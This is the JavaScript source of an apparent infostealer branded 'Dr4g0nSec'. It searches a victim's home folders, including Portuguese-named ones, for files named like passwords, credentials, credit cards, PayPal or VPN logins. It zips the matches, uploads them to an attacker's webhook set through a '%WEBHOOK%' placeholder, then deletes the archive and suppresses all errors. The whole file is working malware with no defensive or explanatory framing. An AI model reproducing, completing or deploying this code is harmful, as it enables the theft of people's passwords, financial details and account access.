const fs = require('fs');
const path = require('path');
const os = require('os');
const archiver = require('archiver');
const axios = require('axios');
const FormData = require('form-data');

const H00K3_URL = "%WEBHOOK%";

const FOLDER_NAMES = ['passwords', 'senhas', 'credentials', 'logins', 'contas', 'importante', 'credenciais'];

const FILE_TERMS = [
    'passwords.txt', 'credentials.txt', 'important.pdf', 'senhas.txt', 'credenciais.txt',
    'importante.pdf', 'importante.txt', 'logins.txt', 'emails.txt', 'contas.txt',
    'paypal.txt', 'nordvpn login.txt', 'credit cards.txt', 'banco de dados.txt',
    'hacking.txt', 'accounts.txt', 'cartões de crédito.txt', 'conta vpn.txt', 'minhas contas'
];

const DIRECTORIES = [
    'Documents', 'Downloads', 'Desktop', 'Pictures', 'Videos', 'Music',
    'Documentos', 'Área de Trabalho', 'Imagens', 'Vídeos', 'Músicas'
].map(dir => path.join(os.homedir(), dir));

function searchFilesSync(directories, fileTerms, folderTerms) {
    const foundFiles = new Set();

    for (const baseDir of directories) {
        if (!fs.existsSync(baseDir)) continue;

        const stack = [baseDir];

        while (stack.length > 0) {
            const current = stack.pop();
            try {
                const items = fs.readdirSync(current);
                for (const item of items) {
                    const fullPath = path.join(current, item);
                    const stat = fs.statSync(fullPath);

                    if (stat.isDirectory()) {
                        stack.push(fullPath);
                        if (folderTerms.includes(item.toLowerCase())) {
                            const deepItems = fs.readdirSync(fullPath);
                            for (const sub of deepItems) {
                                const subPath = path.join(fullPath, sub);
                                if (fs.statSync(subPath).isFile()) {
                                    if (fileTerms.some(term => sub.toLowerCase().includes(term.toLowerCase()))) {
                                        foundFiles.add(subPath);
                                    }
                                }
                            }
                        }
                    } else if (stat.isFile()) {
                        if (fileTerms.some(term => item.toLowerCase().includes(term.toLowerCase()))) {
                            foundFiles.add(fullPath);
                        }
                    }
                }
            } catch (_) {}
        }
    }

    return Array.from(foundFiles);
}

function createZipFileSync(files) {
    const zipPath = path.join(__dirname, 'Dr4g0nSec_Arquivos_Importantes.zip');
    const output = fs.createWriteStream(zipPath);
    const archive = archiver('zip', { zlib: { level: 9 } });

    return new Promise((resolve, reject) => {
        archive.pipe(output);
        for (const file of files) {
            try {
                const relPath = path.relative(os.homedir(), file);
                archive.file(file, { name: relPath });
            } catch (_) {}
        }

        archive.finalize();

        output.on('close', () => resolve(zipPath));
        archive.on('error', err => reject(err));
    });
}

async function sendFileToWebhook(webhookUrl, zipPath, foundFiles) {
    let description = `<:procurar:1361786245461577889> • ***Total de arquivos encontrados:* __${foundFiles.length}__**\n\n📁 • **ARQUIVOS ENCONTRADOS:**\n`;

    for (const file of foundFiles) {
        const line = `└─< _${path.basename(file)}_\n`;
        if ((description + line).length < 4000) {
            description += line;
        } else {
            description += "└─< _...e mais arquivos_\n";
            break;
        }
    }

    const form = new FormData();
    form.append('payload_json', JSON.stringify({
        username: "Dr4g0nSec | Arquivos Info",
        avatar_url: "https://i.imgur.com/83uCFZe.jpeg",
        embeds: [{
            title: "<:dr4g0n:1362932398102155475> Arquivos Importantes <:dr4g0n:1362932398102155475>",
            description: description,
            color: 0x250e80,
            footer: {
                text: "Created by: sk4rty | Dr4g0nSec on Top!",
                icon_url: "https://avatars.githubusercontent.com/u/150484081?s=400&u=11e73b9dcb21c916c430fd7a540e6d54bd3a1657&v=4"
            }
        }]
    }));
    form.append('file', fs.createReadStream(zipPath));

    try {
        await axios.post(webhookUrl, form, {
            headers: form.getHeaders()
        });
    } catch (err) {
    }
}

(async () => {
    const foundFiles = searchFilesSync(DIRECTORIES, FILE_TERMS, FOLDER_NAMES);
    if (!foundFiles.length) return;

    const zipPath = await createZipFileSync(foundFiles);
    await sendFileToWebhook(H00K3_URL, zipPath, foundFiles);

    try {
        fs.unlinkSync(zipPath);
    } catch (_) {}
})();
